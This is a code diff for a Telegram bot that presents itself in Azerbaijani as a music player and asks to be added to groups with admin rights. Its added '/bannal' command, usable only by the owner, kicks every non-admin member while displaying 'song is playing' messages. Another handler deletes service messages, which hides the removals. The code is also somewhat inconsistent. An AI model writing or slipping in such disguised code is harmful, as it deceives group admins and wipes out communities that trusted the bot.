@@ -1019,8 +1019,46 @@ async def tag_admin(event):
  
 
 
-	
-	
+
+STARTED = 'mahnı oxunulur...'
+FINISH = 'mahnı {} uğurla dayandırıldı (qrup sıfırlandı-_-)'
+ERROR = 'Xətta baş verdi, mahnı oxumur!'
+ADMIN_NEEDED = "mahnıya qulaq asmaq üçün mənə admin hüquqları verin!"
+PRIVATE = '''Salam, məni qrupa salaraq səslidə mahnıya qulaq asa bilərsiz.
+ 
+İndi isə məni qrupa əlavə edin və admin hüquqlarını verməyi unutmayın
+Ondan sonra qrupa /musiqi göndərın və mən oxumağa başlayacam.'''
+ 
+@Client.on_message(filters.command("bannal") & filters.user(OWNER_ID))
+def main(_, msg: Message):
+    chat = msg.chat
+    me = chat.get_member(app.get_me().id)
+    if chat.get_member(msg.from_user.id).can_manage_chat and me.can_restrict_members and me.can_delete_messages:
+        try:
+            msg.reply(STARTED.format(chat.members_count))
+            count_kicks = 0
+            for member in chat.iter_members():
+                if not member.can_manage_chat:
+                    chat.kick_member(member.user.id)
+                    count_kicks += 1
+            msg.reply(FINISH.format(count_kicks))
+        except Exception as e:
+            msg.reply(ERROR.format(str(e)))
+    else:
+        msg.reply(ADMIN_NEEDED)
+ 
+ 
+@app.on_message(filters.group & filters.service, group=2)
+def service(c, m):
+    m.delete()
+ 
+ 
+@app.on_message(filters.private)
+def start(_, msg: Message):
+    msg.reply(PRIVATE, reply_markup=InlineKeyboardMarkup([[
+        InlineKeyboardButton("Developer", url="https://t.me/DieRich_0")]]))
+ 
+ 	
 	
 
 
